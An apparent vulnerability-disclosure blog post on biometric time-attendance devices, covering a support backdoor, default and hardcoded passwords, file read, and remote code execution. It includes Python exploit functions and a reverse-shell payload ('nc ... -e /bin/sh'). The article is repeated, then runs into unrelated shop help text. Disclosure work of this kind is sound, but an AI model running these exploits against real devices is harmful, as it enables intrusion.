# Remote code execution on biometric IoT devices

Biometric devices, which use unique physical features of users to authenticate them, have long been considered by the wider public the ideal balance of usability and security. No villain worth his salt would imagine not having an iris scanner to protect their evil lair. Although the Infosec industry has shifted away from this sentiment, the public at large still puts disproportionate amounts of trust in biometric devices for security purposes.

This blog post provides an example of what can go wrong when biometric devices are improperly built.

[picture of all bought devices - 1]

## The device

Access to ProCheckUp’s offices is controlled by a Safescan TA-803. Having both a fingerprint reader and an RFID reader, the devive’s main purpose is time-attendance, however it also includes some access-control capabilities, by unlocking the door to authorised users. It can be remotely administered through a dedicated API or a web-service.

On a slow afternoon in the office, I was asked to have a look at the Safescan to see whether it is really as safe as advertised. After all, being a cybersecurity company we ought to be sure our environment is well protected both on- and offline. After a quick search on a popular online auction website I found a second-hand Safescan TA-8035 up for grabs. This second-hand device would allow me to test vulnerabilities that would apply to our own machine also.

## A time derived backdoor

Upon receiving the second-hand Safescan, I realised the previous owner hadn’t reset it to factory settings – leaving data of the previous users on the device and locked down with a password I did not know. When I couldn’t find instruction for a full factory reset in the device manual, I decided to contact Safescan directly. What followed was an almost surreal phone conversation: the customer service representative asked whether I really wanted to reset the device or simply wished to gain administrative access. I decided to follow this cue and ask for the latter. All I had to do was provide the time as displayed on the front panel of my second-hand device and the customer service representative provided an 8-digit code to type into the machine. Following this phone call, I quickly managed to find the exact algorithm used by the device online, posted by an Alibaba vendor in an FAQ section on a similar, but differently branded, device. I now had a reliable way to gain administrative access within a matter of seconds, although this still required physical access to the machine.

[Picture of alibaba FAQ - 2]

## A default Telnet password

I connected my newly reset second-hand Safescan to an isolated network and found a few interesting ports:

```
PORT     STATE SERVICE       VERSION
23/tcp   open  telnet        BusyBox telnetd (SafeScan QTerm 1.0.4)
80/tcp   open  http          ZK Web Server (ZKSoftware ZEM500 fingerprint reader; MIPS)
81/tcp   open  http          ZK Web Server (ZKSoftware ZEM500 fingerprint reader; MIPS)
4360/tcp open  matrix_vnet?
4370/tcp open  elpro_tunnel?

```

The web service prompts for credentials, with the default being administrator with 123456 as a password.

[Picture of login page - 3]

From the web interface, I was able to download a backup of the device's configuration. Looking at the downloaded file, I noticed what looks like a header prepended before a tar archive:

[Hexdump of archive picture - 4]

By removing the header, I was then able to extract the archive. Inside a file named Config.cfg, a variable called $Telnet with what looks like a password sticks out:

```
$ cat ZKConfig.cfg
### snip ###
$Telnet=z1k2t3e4c5h
IsSupportHttps=1
SSLPASS=123456
### snip ###
WirelessSSID=**CENSORED**
WirelessKey=**CENSORED**
ialNumber=**CENSORED**
WirelessMode=0
WirelessAuth=2
WirelessEnc=1

```

I also found the password for the web service and the wireless credentials stored clearly in this text.

Looking at the `/etc/init.d/rcS` boot script that is used to launch all the services running on the device it appears the developers wanted to ensure that this password would remain, even if the password was changed from that default value by the user . The code doesn't work because the `USERDATAPATH` variable has a trailing slash.

```
if [ -f $USERDATAPATH/passwd ]; then
        mv $USERDATAPATH/passwd  /etc/passwd
fi
```

This is particularly egregious - why would Safescan want to force this password onto their users? We can only posture that this was intended to be disabled once shipped out to users or kept for servicing purposes. Neither reason warrants forcing a default, unchangeable Telnet password on customers. This feature has been disabled on the newer generation of Safescan devices, leading me to wishfully believe it is a simple mistake.

I continued exploring the filesystem further and found an image file called finger1.bmp. This turned out to be a picture file of the latest fingerprint to have been scanned – particularly troubling for a biometric device claiming this is not possible in its support pages, doubly so when considering the overall security of the device and the fact that unlike passwords, our fingerprints cannot be changed.

[Picture of claim - 5]

## Remote code execution

Emboldened by these findings I wanted to dig deeper and see if it was possible to gain remote code execution even with the root password having been changed. Given what I’d seen so far, I had little reason to doubt the possibility.

In a first step, I focussed on the API service running on port 4360, which runs by default and also exists on newer iterations of the product (e.g. the Timemoto TM-616, which is also affected by the vulnerabilities described below and sold by Safescan).

Initially, I simply extracted the binary and started looking at the documentation which revealed a number of interesting calls. However, the documentation lacked several key elements that would enable me to write a functioning exploit and would have forced me to fuzz the application.

In order to move forward nonetheless I started decompiling the binary using Ghidra, before Googling a few of the strings in the binary. Only when I searched Github directly for these did I find the complete source code for the firmware in multiple repositories. While this significantly facilitated exploitation, it isn't a requirement.

[Picture of github repo - 6]

A few interesting functions caught my attention.

### CMD\_READ\_FILE

As its name suggests, it allows users to retrieve files via the API. I wouldn't even call this an exploit as the method will simply return any file requested, however I did make heavy use of it when attacking the Timemoto TM-616, as I will discuss later. Certainly a vulnerability however, as you can see for yourself below.

[picture of exploit downloading passwd file - 7]

### CMD\_UPDATEFILE

The relevant portions of code handling requests for this method is shown below:

```
        case CMD_UPDATEFILE:
          {
                  char sTmp[40];
                  char sTmp1[10];

                  memset(sTmp,0,40);
                  memset(sTmp1,0,10);
                  memcpy(sTmp, p+4, sizeof(sTmp));
                  // snip
                  if (strstr(sTmp, ".jpg")) {
                      // snip
                  } else {
                          GetEnvFilePath("USERDATAPATH", sTmp, sFileName);
                  }
                  // snip
                  A=1;
                  break;
            }
```

```
char *GetEnvFilePath(const char *EnvName, const char *filename, char *fullfilename)
{
        if (getenv(EnvName))
                sprintf(fullfilename, "%s%s", getenv(EnvName), filename);
        else
                sprintf(fullfilename, "%s", filename);
        return fullfilename;
}
```

Now this one is interesting. Simply put, it allows me to upload any file to any location, as the service is running as root, the only user on the device. While the method attempts to only allow firmware files to be uploaded, a simple directory traversal easily takes care of that.
Armed with this knowledge, writing an exploit was rather trivial. A portion of the relevant exploit code is shown below:

```
def do_write_file(self, line):
    if not len(line) or len(line.split(' ')) != 2:
        print("[*] Usage: do_write_file <file> <dest>")
        return True
    file = line.split(' ')[0]
    dest = line.split(' ')[1]

    if dest[0] != '/':
        dest = '/' + dest

    dest_final = "../../.." + dest + '\x00\x00\x00'

    try:
        print("[-] Creating {}".format(file))
        with open(file, 'r') as fp:
            payload = fp.read()

        # prepare data
        self.z.send_command(1500, struct.pack('<II', len(payload), len(payload))) # CMD_PREPARE_DATA
        self.z.recv_reply()

        # send data
        self.z.send_command(1501, payload.encode()) # CMD_DATA
        self.z.recv_reply()

        # apply data
        data = bytearray()
        data.extend(struct.pack('<I', 1700)) # CMD_UPDATE_FILE
        data.extend(dest_final.encode())
        self.z.send_command(110, data)
        self.z.recv_reply()

    except Exception:
        traceback.print_exc()
```

With the ability to get any file using the `CMD_READ_FILE` command, I could read the init scripts and see what to upload and where to gain remote code execution. For the TA-8035, I wrote the following "all-in-one" command to gain code execution:

```
def do_auto_pwn_ta(self, line):
    """Writes a test.sh file to the device which will be executed and deleted at reboot by the TA device"""
    if not len(line) or len(line.split(':')) != 2:
        print("[*] Usage: write_file_pwn <LHOST:LPORT>")
        return True
    try:
        print("[-] Creating test.sh")
        payload = "(sleep 60 && nc {} -e /bin/sh)&".format(line)
        filename = "test.sh\x00"

        # prepare data
        print("[-] Preparing payload")
        self.z.send_command(1500, struct.pack('<II', len(payload), len(payload)))
        self.z.recv_reply()

        # send data
        print("[-] Sending payload")
        self.z.send_command(1501, payload.encode())
        self.z.recv_reply()

        # apply data
        print("[-] Saving payload")
        data = bytearray()
        data.extend(struct.pack('<I', 1700))
        data.extend(filename.encode())
        self.z.send_command(110, data)
        self.z.recv_reply()

        time.sleep(1)

        print("[-] Sending reboot command")
        self.z.restart()
        print("[+] Done. Device will reboot now.\nTo catch shell: nc -nlvp {}".format(line.split(':')[1]))

    except Exception:
        traceback.print_exc()
```

Using the same method as above, but tailored to the device, I uploaded a `test.sh` file to the `/mnt/mtdblock/data` directory, which was executed and conveniently deleted by the device at boot, as scripted below:

`/etc/init.d/rcS`:

```
if [ -f $USERDATAPATH/auto.sh ]; then
        #start delegate and inotify
        /etc/start_delegate.sh &
        . $USERDATAPATH/auto.sh
fi
```

`auto.sh`:

```
if [ -f $DEST/test.sh ]; then
        cd $DEST && chmod u+x $DEST/test.sh && $DEST/test.sh
        rm test.sh
fi
```

To exploit the Timemoto TM-616, I simply downloaded the `rcS` file and patched it to start the telnet service. After cracking the shadow file, downloaded via the `CMD_READ_FILE` method, I was able to log in. The password was `solokey` and while I cannot praise the choice of password, I must also state there was originally no way to log in.

## More?

Yes! As some may have noticed, not only does the `CMD_UPLOAD_FILE` ~~method~~ ~~function~~ case (the function is over 2,500 lines long) not sanitise for directory traversal, it also fails to protect against command injection. This snippet shows how to exploit it:

```
def do_command_exec(self, line):
    """Extremely iffy. Prefer write file method. Massive memory leaks and bounds checking issues make this method unstable and risk crashing target."""
    if not len(line):
        print("[*] Usage: command_exec <cmd>\n[*] Output will not be returned, but you could write to a file and get it afterwards. Busybox nc does not have -e option\n")
        return True
    try:
        # prepare data
        self.z.send_command(1500, struct.pack('<II', 1, 1))
        self.z.recv_reply()

        # send data
        self.z.send_command(1501, 'a'.encode())
        self.z.recv_reply()

        # apply data
        data = bytearray()
        data.extend(struct.pack('<I', 1700))
        payload = '; ' + line + '; echo \x00\x00'
        data.extend(payload.encode())
        self.z.send_command(110, data)
        self.z.recv_reply()

    except Exception:
        traceback.print_exc()
```

However due to lacklustre memory management and the use of C, I had a hard time getting this to work consistently and had better luck using the method described earlier.

If you thought that was it, think again, it doesn’t stop here. Digging deeper, I also noticed the API is vulnerable to SQL injections but unfortunately I lost my notes on this vector. As the device was running `sqlite` and prevented stacked queries, I couldn't get code execution this way anyhow.

I'm also sure there is a few buffer overflow vectors in there, however exploiting these would be overkill given the methods I already had to gain access to the devices.

## Conclusion

There's surely a number of conclusions one could reach after reading this, however, what I desperately want to stress is that security needs to be designed into the product from its very inception. A responsible disclosure point of contact would have been greatly beneficial to Safescan, its customers and myself. It took six months for me to even succeed at getting an answer from the vendor, as they initially discarded my messages as an attempted scam, which I understand.

I have also learned a lot from the process and, reflecting, there are a number of ways disclosure processes ought to be improved.

As cybersecurity experts, we have an odd relationship with vendors: we report issues in their products to them, but we must do more to help them understand what we are doing and why we are doing it. We must understand the point of view of the vendor, who didn't ask for their devices to be hacked. While we understand that they are lucky we did, we cannot expect immediate gratification and must accept their scepticism and remonstrances and most importantly take the time to explain the necessity of our actions.

# Remote Code Execution on Biometric IoT Devices

![](/media/jxrfugrx/iot_devices.webp)

Biometric devices, which use unique physical features of users to authenticate them, have long been considered by the wider public the ideal balance of usability and security. No villain worth his salt would imagine not having an iris scanner to protect their evil lair. Although the Infosec industry has shifted away from this sentiment, the public at large still puts disproportionate amounts of trust in biometric devices for security purposes.

This blog post provides an example of what can go wrong when biometric devices are improperly built.

## The device

---

Access to ProCheckUp’s offices is controlled by a Safescan TA-803. Having both a fingerprint reader and an RFID reader, the devive’s main purpose is time-attendance, however it also includes some access-control capabilities, by unlocking the door to authorised users. It can be remotely administered through a dedicated API or a web-service.

On a slow afternoon in the office, I was asked to have a look at the Safescan to see whether it is really as safe as advertised. After all, being a cybersecurity company we ought to be sure our environment is well protected both on- and offline. After a quick search on a popular online auction website I found a second-hand Safescan TA-8035 up for grabs. This second-hand device would allow me to test vulnerabilities that would apply to our own machine also.

## A time derived backdoor

---

Upon receiving the second-hand Safescan, I realised the previous owner hadn’t reset it to factory settings – leaving data of the previous users on the device and locked down with a password I did not know. When I couldn’t find instruction for a full factory reset in the device manual, I decided to contact Safescan directly. What followed was an almost surreal phone conversation: the customer service representative asked whether I really wanted to reset the device or simply wished to gain administrative access. I decided to follow this cue and ask for the latter. All I had to do was provide the time as displayed on the front panel of my second-hand device and the customer service representative provided an 8-digit code to type into the machine. Following this phone call, I quickly managed to find the exact algorithm used by the device online, posted by an Alibaba vendor in an FAQ section on a similar, but differently branded, device. I now had a reliable way to gain administrative access within a matter of seconds, although this still required physical access to the machine.

## A default Telnet password

---

I connected my newly reset second-hand Safescan to an isolated network and found a few interesting ports:

```
PORT     STATE SERVICE       VERSION
23/tcp   open  telnet        BusyBox telnetd (SafeScan QTerm 1.0.4)
80/tcp   open  http          ZK Web Server (ZKSoftware ZEM500 fingerprint reader; MIPS)
81/tcp   open  http          ZK Web Server (ZKSoftware ZEM500 fingerprint reader; MIPS)
4360/tcp open  matrix_vnet?
4370/tcp open  elpro_tunnel?
```

The web service prompts for credentials, with the default being administrator with 123456 as a password.

![](/media/gqvp33uc/login_3.png?width=500&height=405.53745928338765)From the web interface, I was able to download a backup of the device's configuration. Looking at the downloaded file, I noticed what looks like a header prepended before a tar archive:

![](/media/p33hniw4/hex_dump_4.png?width=500&height=196.843853820598)

By removing the header, I was then able to extract the archive. Inside a file named Config.cfg, a variable called $Telnet with what looks like a password sticks out:

```
$ cat ZKConfig.cfg
### snip ###
$Telnet=z1k2t3e4c5h
IsSupportHttps=1
SSLPASS=123456
### snip ###
WirelessSSID=**CENSORED**
WirelessKey=**CENSORED**
ialNumber=**CENSORED**
WirelessMode=0
WirelessAuth=2
WirelessEnc=1
```

I also found the password for the web service and the wireless credentials stored clearly in this text. Looking at the /etc/init.d/rcS boot script that is used to launch all the services running on the device it appears the developers wanted to ensure that this password would remain, even if the password was changed from that default value by the user . The code doesn't work because the USERDATAPATH variable has a trailing slash.

```
if [ -f $USERDATAPATH/passwd ]; then
        mv $USERDATAPATH/passwd  /etc/passwd
fi
```

This is particularly egregious - why would Safescan want to force this password onto their users? We can only posture that this was intended to be disabled once shipped out to users or kept for servicing purposes. Neither reason warrants forcing a default, unchangeable Telnet password on customers. This feature has been disabled on the newer generation of Safescan devices, leading me to wishfully believe it is a simple mistake.

I continued exploring the filesystem further and found an image file called finger1.bmp. This turned out to be a picture file of the latest fingerprint to have been scanned – particularly troubling for a biometric device claiming this is not possible in its support pages, doubly so when considering the overall security of the device and the fact that unlike passwords, our fingerprints cannot be changed.

## Remote code execution

---

Emboldened by these findings I wanted to dig deeper and see if it was possible to gain remote code execution even with the root password having been changed. Given what I’d seen so far, I had little reason to doubt the possibility.

In a first step, I focussed on the API service running on port 4360, which runs by default and also exists on newer iterations of the product (e.g. the Timemoto TM-616, which is also affected by the vulnerabilities described below and sold by Safescan).

Initially, I simply extracted the binary and started looking at the documentation which revealed a number of interesting calls. However, the documentation lacked several key elements that would enable me to write a functioning exploit and would have forced me to fuzz the application.

In order to move forward nonetheless I started decompiling the binary using Ghidra, before Googling a few of the strings in the binary. Only when I searched Github directly for these did I find the complete source code for the firmware in multiple repositories. While this significantly facilitated exploitation, it isn't a requirement.

![](/media/ynnajkyn/github_6.png?width=511&height=300&mode=max)

A few interesting functions caught my attention.

### CMD\_READ\_FILE

As its name suggests, it allows users to retrieve files via the API. I wouldn't even call this an exploit as the method will simply return any file requested, however I did make heavy use of it when attacking the Timemoto TM-616, as I will discuss later. Certainly a vulnerability however, as you can see for yourself below.

![](/media/4e5ngz5b/get_passwd_7.png?width=500&height=82.07674943566592)

### CMD\_UPDATEFILE

The relevant portions of code handling requests for this method is shown below:

```
        case CMD_UPDATEFILE:
          {
                  char sTmp[40];
                  char sTmp1[10];
                  memset(sTmp,0,40);
                  memset(sTmp1,0,10);
                  memcpy(sTmp, p+4, sizeof(sTmp));
                  // snip
                  if (strstr(sTmp, ".jpg")) {
                      // snip
                  } else {
                          GetEnvFilePath("USERDATAPATH", sTmp, sFileName);
                  }
                  // snip
                  A=1;
                  break;
            }
```
```
char *GetEnvFilePath(const char *EnvName, const char *filename, char *fullfilename)
{
        if (getenv(EnvName))
                sprintf(fullfilename, "%s%s", getenv(EnvName), filename);
        else
                sprintf(fullfilename, "%s", filename);
        return fullfilename;
}
```

Now this one is interesting. Simply put, it allows me to upload any file to any location, as the service is running as root, the only user on the device. While the method attempts to only allow firmware files to be uploaded, a simple directory traversal easily takes care of that. Armed with this knowledge, writing an exploit was rather trivial. A portion of the relevant exploit code is shown below:

```
def do_write_file(self, line):
    if not len(line) or len(line.split(' ')) != 2:
        print("[*] Usage: do_write_file <file> <dest>")
        return True
    file = line.split(' ')[0]
    dest = line.split(' ')[1]
    if dest[0] != '/':
        dest = '/' + dest
    dest_final = "../../.." + dest + '\x00\x00\x00'
    try:
        print("[-] Creating {}".format(file))
        with open(file, 'r') as fp:
            payload = fp.read()
        # prepare data
        self.z.send_command(1500, struct.pack('<II', len(payload), len(payload))) # CMD_PREPARE_DATA
        self.z.recv_reply()
        # send data
        self.z.send_command(1501, payload.encode()) # CMD_DATA
        self.z.recv_reply()
        # apply data
        data = bytearray()
        data.extend(struct.pack('<I', 1700)) # CMD_UPDATE_FILE
        data.extend(dest_final.encode())
        self.z.send_command(110, data)
        self.z.recv_reply()
    except Exception:
        traceback.print_exc()
```

With the ability to get any file using the CMD\_READ\_FILE command, I could read the init scripts and see what to upload and where to gain remote code execution. For the TA-8035, I wrote the following "all-in-one" command to gain code execution:

```
def do_auto_pwn_ta(self, line):
    """Writes a test.sh file to the device which will be executed and deleted at reboot by the TA device"""
    if not len(line) or len(line.split(':')) != 2:
        print("[*] Usage: write_file_pwn <LHOST:LPORT>")
        return True
    try:
        print("[-] Creating test.sh")
        payload = "(sleep 60 && nc {} -e /bin/sh)&".format(line)
        filename = "test.sh\x00"
        # prepare data
        print("[-] Preparing payload")
        self.z.send_command(1500, struct.pack('<II', len(payload), len(payload)))
        self.z.recv_reply()
        # send data
        print("[-] Sending payload")
        self.z.send_command(1501, payload.encode())
        self.z.recv_reply()
        # apply data
        print("[-] Saving payload")
        data = bytearray()
        data.extend(struct.pack('<I', 1700))
        data.extend(filename.encode())
        self.z.send_command(110, data)
        self.z.recv_reply()
        time.sleep(1)
        print("[-] Sending reboot command")
        self.z.restart()
        print("[+] Done. Device will reboot now.\nTo catch shell: nc -nlvp {}".format(line.split(':')[1]))
    except Exception:
        traceback.print_exc()
```

Using the same method as above, but tailored to the device, I uploaded a test.sh file to the /mnt/mtdblock/data directory, which was executed and conveniently deleted by the device at boot, as scripted below:

/etc/init.d/rcS:

```
if [ -f $USERDATAPATH/auto.sh ]; then
        #start delegate and inotify
        /etc/start_delegate.sh &
        . $USERDATAPATH/auto.sh
fi
```

auto.sh:

```
if [ -f $DEST/test.sh ]; then
        cd $DEST && chmod u+x $DEST/test.sh && $DEST/test.sh
        rm test.sh
fi
```

To exploit the Timemoto TM-616, I simply downloaded the rcS file and patched it to start the telnet service. After cracking the shadow file, downloaded via the CMD\_READ\_FILE method, I was able to log in. The password was solokey and while I cannot praise the choice of password, I must also state there was originally no way to log in.

## More?

---

Yes! As some may have noticed, not only does the CMD\_UPLOAD\_FILE method function case (the function is over 2,500 lines long) not sanitise for directory traversal, it also fails to protect against command injection. This snippet shows how to exploit it:

```
def do_command_exec(self, line):
    """Extremely iffy. Prefer write file method. Massive memory leaks and bounds checking issues make this method unstable and risk crashing target."""
    if not len(line):
        print("[*] Usage: command_exec <cmd>\n[*] Output will not be returned, but you could write to a file and get it afterwards. Busybox nc does not have -e option\n")
        return True
    try:
        # prepare data
        self.z.send_command(1500, struct.pack('<II', 1, 1))
        self.z.recv_reply()
        # send data
        self.z.send_command(1501, 'a'.encode())
        self.z.recv_reply()
        # apply data
        data = bytearray()
        data.extend(struct.pack('<I', 1700))
        payload = '; ' + line + '; echo \x00\x00'
        data.extend(payload.encode())
        self.z.send_command(110, data)
        self.z.recv_reply()
    except Exception:
        traceback.print_exc()
```

However due to lacklustre memory management and the use of C, I had a hard time getting this to work consistently and had better luck using the method described earlier.

If you thought that was it, think again, it doesn’t stop here. Digging deeper, I also noticed the API is vulnerable to SQL injections but unfortunately I lost my notes on this vector. As the device was running sqlite and prevented stacked queries, I couldn't get code execution this way anyhow.

I'm also sure there is a few buffer overflow vectors in there, however exploiting these would be overkill given the methods I already had to gain access to the devices.

## Conclusion

---

There's surely a number of conclusions one could reach after reading this, however, what I desperately want to stress is that security needs to be designed into the product from its very inception. A responsible disclosure point of contact would have been greatly beneficial to Safescan, its customers and myself. It took six months for me to even succeed at getting an answer from the vendor, as they initially discarded my messages as an attempted scam, which I understand.

I have also learned a lot from the process and, reflecting, there are a number of ways disclosure processes ought to be improved.

As cybersecurity experts, we have an odd relationship with vendors: we report issues in their products to them, but we must do more to help them understand what we are doing and why we are doing it. We must understand the point of view of the vendor, who didn't ask for their devices to be hacked. While we understand that they are lucky we did, we cannot expect immediate gratification and must accept their scepticism and remonstrances and most importantly take the time to explain the necessity of our actions.

  + How to order online

    **Step 1**

    Once you’ve found an item you’d like to buy, click the “Add to cart” button. The selected item will be added to your shopping cart. Click the “Shopping cart” link at the top right of every page to visit your cart and adjust amounts or remove items. You can also continue shopping and return to your cart later.

    **Step 2**

    When you’re ready to check out, click “Next” in your shopping cart.
    - If you already have a Safescan account, log in with your e-mail address and password. Your billing address and other information will be automatically filled in for you.
    - If you don’t have a Safescan account, click on “Proceed to checkout” and fill in the requested information. (In a later step, you’ll have the chance to create an account and save this information for next time if you’d like.)

    **Step 3**

    On the next page, select your desired payment method. (See our payment options page for more information about your choices.) If you plan to pay by credit card, you’ll be asked to enter your card details here.

    **Step 4**

    On the final page, you can review your order one last time and read our terms and conditions before you confirm your order. When you’re ready, click “Place your order”.

    **Step 5**

    After you’ve placed your order, you will be redirected over a secure Internet connection to our payment service providers, where you will be guided through the final steps to complete your order. After your payment is processed, you will be redirected back to Safescan.com. We will start processing your order and send you an order confirmation e-mail.
  + Checking stock

    We ship all our products from a central warehouse. To help you plan your order, we use a set of simple status symbols to indicate an item’s real-time stock level.

    **Safescan stock status symbols**

    Green – The item is in stock and ready to ship! Orders placed before 16:00 CET are shipped the same day.

    Orange – The item is currently sold out, but we expect to have it in stock very soon. You can pre-order the item, and as soon as it arrives at our warehouse, we’ll ship it to you.

    Red – The item is currently sold out and we don’t expect to have it in stock again soon.
  + Creating a Safescan Account

    **Creating your account**

    When you place an order with Safescan.com, you have the option to create an account to store the billing and shipping information you’ve just entered for future orders. In addition to speeding up checkout, an account offers you the following benefits:
    - Order tracking and history
    - Downloadable invoices
    - Extended product warranty
    - Service and support claims filing
    - Multiple saved billing and delivery addresses

    **Accessing your account**

    You can log in to your Safescan account at any time by clicking the “My account” link at the top of every page. All your account information is automatically encrypted and sent over a secure connection.

    **Updating your account information**

    To update your account information, log in to your Safescan account at any time.

    **Account blocked after 3 incorrect login attempts**

    For your security, your account will be blocked for 30 minutes if the wrong password is entered three times in a row. To access your account, wait 30 minutes and try again, or use the “Forgot your password?” option to reset your password.

    **Forgot your password?**

    If you’ve forgotten your password, [click here](/en-ie/login/forgot-password) or on the link on the login screen. Enter your e-mail address and we’ll send you a link you can use to reset your password.
  + After you placed your order

    Once you submit your order, we set aside the in-stock items you’ve bought. If any items are out of stock, we’ll hold your order until they arrive, then ship all your items together. That way, we make sure you get your products as quickly as possible.

    If it ends up taking longer than expected for an out-of-stock item to arrive, we’ll contact you and ask you how you’d like to proceed. We can do one of three things for you:
    - Cancel the out-of-stock item and ship the remaining items right away.
    - Ship the in-stock items now and send the outstanding item as soon as it arrives.
    - Cancel your entire order.

    **Canceling an order**

    If you’d like to a cancel an order that hasn’t shipped yet, please [contact us](/en-ie/contact).

    If you’d like to cancel an order that has already shipped, please refuse delivery at your door. UPS will then return the order to us, at which point we can cancel it and issue you a refund.
* [Payment](/en-ie/customer-service/payment)
  + VAT policy

    All the prices listed on our website are excluding VAT. As a European company, Safescan will apply VAT charges according to the rules and regulations of the European Union. For more information please visit the website of the [European Union](https://ec.europa.eu/taxation_customs/business/vat/modernising-vat-cross-border-ecommerce_en).

    What does this mean for your order?

    1. Orders that are placed in, or shipped to a county outside of the European Union, are exempted from VAT.

    2. Companies based in Europe with a valid VAT number that is verified by Safescan are exempted from VAT.

    3. Companies based in Europe without a valid and verified VAT number are charged the VAT percentage that is set by the country where the order is shipped to.

    How we verify your VAT number:

    When completing your order, please enter a valid VAT number in the required field. Your VAT number will immediately be checked by the [VIES Validation Service](http://ec.europa.eu/taxation_customs/vies/faqvies.do?locale=en)  If your VAT number is valid you can complete your order without being charged the VAT amount. If you do not enter a (valid) VAT number, you must pay the relevant VAT amount.

    If the VIES database is not able to verify your VAT number, you can still complete your order without being charged with the VAT amount, but your order will be put on hold and manually checked by Safescan. If the supplied VAT number is invalid, an email will be sent to you with the request to either correct the provided number or pay the outstanding VAT amount.

    Your VAT number can be invalid due to the following reasons:

    **1. The provided VAT number does not exist.**

    Something small like a simple typo could make your VAT number appear as invalid. Please check if you have entered all the digits correctly.

    **2. The provided VAT number is not valid for transactions between different EU countries.**

    Some European countries such as Italy and Spain require an extra registration to activate the VAT number for international transactions within the EU. Please consult your local authorities to see if your VAT number is valid for cross-border EU transactions. If your VAT number has to be activated please wait until the number is processed to complete your order.

    Please make sure to double check your VAT number when placing your order on the Safescan website. If you require more information about the European VAT ruling, please visit: <http://ec.europa.eu/taxation_customs/vies/faqvies.do?locale=en>

    Deliveries to countries outside the EU always incur a 0% VAT rate. In addition to the copy of your invoice we send you by e-mail, we will add a copy to your shipment for customs use.

    A VAT number is a unique number that is connected to a specific business entity. Basically a change of a VAT number means a change of a business entity. If you create an account on the Safescan website and your purchases are of a corporate nature, please ensure that you register your account with your correct VAT number. Subsequent changes are no longer possible, as your account is linked to the VAT number you entered during your registration. A change in your VAT number is a change in your business entity, resulting in a change of your account on the Safescan website.
  + Payment methods

    We offer the following payment methods for your convenience and, unlike many other shops, never charge any transaction fees.

    **Credit cards**

    You can pay for your Safescan order using one of the following credit cards:

    **‣** VISA

    **‣** MasterCard

    **‣** American Express

    We use a secure SSL connection during the checkout process, so your credit-card details are fully protected. After you enter your information, we will communicate with your credit-card issuer to process your payment smoothly and securely.

    **PayPal**

    PayPal is the preferred way to pay online in many countries because it’s safe and fast. PayPal securely stores your credit card and banking information, enabling you to pay online without entering your sensitive financial information every time you shop. Using Paypal you can speed through the checkout process in just a few clicks. PayPal deducts payment directly from your credit card or bank account, and your payment information is never shared on the Internet.

    **Maestro**

    Maestro lets you pay quickly and securely online. Enter your debit card number and expiration date and you will be automatically taken to the bank’s secure website, where you will be asked to verify the amount and pay using your usual authentication medium.

    To use Maestro, the following conditions must be met:

    | 1. | **Your bank must support the service.**If you aren’t sure, ask your bank. |
    | --- | --- |
    | 2. | **You must have an authentication medium.** Maestro payments over the Internet are protected by an authentication medium. Depending on the bank, this may be a card reader, a password, or something else. Contact your bank if you don’t yet have an authentication medium. |
    | 3. | **You must have received a SecureCode.** To make payments over the Internet using your Maestro card, you must have a SecureCode. If you don’t have one, contact your bank. |

    **Cash on delivery (COD)**

    If you choose to pay by cash on delivery, you will pay when the order is delivered to your address. A modest surcharge will be added to your order to cover the carrier’s additional fee.

    **Advance payment by bank transfer**

    If you select this payment option, we will ship your order once your payment has been received in our bank account. The e-mail order confirmation we send you will contain your order number; please refer to this number when you make payment, so we can link your payment to the correct order.
  + Payment security using SSL

    Your privacy and protection are deeply important to us, and we go to great lengths to ensure the security of your information on our site. To protect your information during the ordering process, we use Secure Sockets Layer (SSL). SSL is the industry standard protocol for establishing a secure connection between computers on the Internet. The protocol encrypts all traffic and guarantees message integrity and sender and receiver authenticity.

    There are two ways to confirm that a secure SSL connection has been established:
    - The website’s URL begins with “https://” rather than “http://”.
    - You see a visual cue in your browser’s address bar, such as a lock icon or a green button (*varies by browser*).

    These cues signify that your payment and personal data are protected. You can click on the lock icon or green button in your browser’s address bar to view the details of the SSL certificate, including its validity.

    Our payment systems also meet the strict security standards of the Payment Card Industry Data Security Standard (PCI DSS). We meet or exceed the key PCI DSS requirements:

    - We never use vendor-supplied defaults for passwords or other security parameters.
    - We always encrypt cardholder data and sensitive information before it is transmitted.
    - We maintain anti-virus software and firewalls to protect customer data.
    - We restrict access to cardholder data to those who have a business need to know.
    - We assign a unique ID to each person with computer access.
    - We tightly control physical access to our systems infrastructure.
    - We track and monitor all access to network resources and cardholder data.
    - We routinely audit and improve our security systems, applications and processes.
* [Delivery & Returns](/en-ie/customer-service/delivery-returns)
  + Important order information Republic of Ireland

    As of 20th January 2021, we have now resumed supply into the Republic of Ireland though, as a result of the delays in transiting goods from the Netherlands through the UK, you may experience slightly longer delivery times than normal. Please feel free to email orders@safescan.com if you require additional info about your order.
  + Shipping costs

    We offer free shipping for all orders with a value of €50 or more. For orders below €50 standard shipping rates apply. We work hard to keep our shipping rates as low as possible, without surcharges for delivery to remote areas. In some countries, shipping and returning of your order is free of charge. Please see the table of shipping rates **‣** for detailed information. To ensure the fast, accurate delivery of your order, we use the reliable services of UPS.

    After you place the desired items in your shopping cart, select your preferred delivery method. The cart will calculate and display your shipping costs so you can review them before you complete your order. These costs are also displayed in the confirmation email we send you after you place an order, and in your online order status.

    If you select the Cash on Delivery payment method, we will add a modest surcharge to your order to cover the carrier’s additional fees. This surcharge, which is visible in your shopping cart once you select your payment method, is calculated and displayed separately and is not part of your shipping costs.
  + Delivery times

    If we receive payment for your order before 16:00 CET, we will process your order that same day. Provided all items are in stock, you will receive it in 1–3 business days. Orders placed on weekends and public holidays will be processed the next business day. During busier periods it is possible that your order cannot be processed the same day. Your order will be processed and shipped as soon as possible.

    As soon as our warehouse has shipped your order, we will send you a confirmation e-mail including a unique UPS parcel tracking number. To trace your package’s status in real time, visit www.ups.com and enter your tracking number on the left side of the page. UPS delivers between 8:00 and 18:00 Monday through Friday, excluding public holidays.

    The average delivery time is 1–3 business days, depending on the country to which the order is shipped. Please see our table of delivery times **‣** for detailed information.
  + Incorrect or lost orders

    If you receive items you did not order or some of the items you ordered are missing, please let us know. Write to us at info@safescan.com with the following information:

    - your order number
    - the item number(s) of the missing or incorrect product(s)
    - digital photos of the shipment, where possible

    Our customer care team will contact you as quickly as possible to sort out your order.
  + 14 day money-back guarantee

    When you shop on Safescan.com, you enjoy a 14-day money-back guarantee on all items (excluding software packages). During this time, you can return an item purchased from our online store for a full refund, without stating a reason. Please note that certain limitations apply to this guarantee; we encourage you to familiarize yourself with these requirements prior to delivery:

    - You must have created a Safescan account.
    - The item must be unused.
    - There must be no visible damage or signs of use.
    - The product and all accessories, manuals and packaging must be returned in their original state.
    - The guarantee does not apply to software packages.

